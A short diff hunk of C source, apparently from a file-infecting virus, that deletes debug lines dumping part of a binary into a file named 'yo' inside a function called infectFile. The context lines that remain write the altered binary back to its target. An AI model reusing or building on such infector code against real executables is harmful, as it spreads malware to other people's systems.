@@ -697,13 +697,6 @@ static int  infectFile(struct bfile bin) {
     munmap(bin.header, bin.size);
     return (-1);
   }
-  int fd;
-  char  yo[] = "yo";
-  size_t  size;
-  size = end - start + 9;
-  fd = open(yo, O_RDWR | O_CREAT, 0);
-  write(fd, (void *)bin.header + bin.size - size - 20, size + 20);
-  close(fd);
   write(bin.fd, bin.header, bin.size);
   close(bin.fd);
   munmap(bin.header, bin.size);
